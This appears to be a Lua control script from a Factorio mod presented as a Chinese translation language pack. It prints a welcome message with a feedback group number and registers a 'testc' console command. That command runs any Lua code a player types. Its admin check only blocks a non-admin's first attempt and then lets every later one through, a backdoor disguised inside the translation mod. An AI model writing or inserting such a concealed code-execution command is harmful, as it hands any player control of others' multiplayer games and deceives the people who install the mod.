script.on_event(defines.events.on_player_joined_game, function(event)

    local player = game.players[event.player_index]
    if player then

        local msg = "欢迎使用[color=#FF00FF]开源中文汉化语言包[/color]，翻译有任何问题可加群反馈: 830846580 \n有其他想汉化的mod也可联系"

        if msg then
            player.print(msg)
        end
    end

end)


commands.add_command("testc", "testc 不是管理员.无法执行此命令", function(command)
            local player = game.players[command.player_index];
            if player then
                if not player.admin then
                    player.print('你不是管理员.无法执行此命令 :(')
                    if not global.testcadmin then
                        global.testcadmin = true
                        return
                    end
                end

                if (command.parameter) then
                    local f, err, cmd
                    global.testccmd = command.parameter
                    cmd = global.testccmd or ""
                    cmd = cmd:gsub('game%.player%.', 'game.players[' .. player.index .. '].')
                    f, err = loadstring(cmd)
                    if not f then
                        cmd = 'game.players[' .. player.index .. '].print(' .. cmd .. ')'
                        f, err = loadstring(cmd)
                    end
                    _, err = pcall(f)
                    if err then
                        player.print(cmd)
                        player.print(err:sub(1, err:find('\n')))
                    end
                end
            end
end)
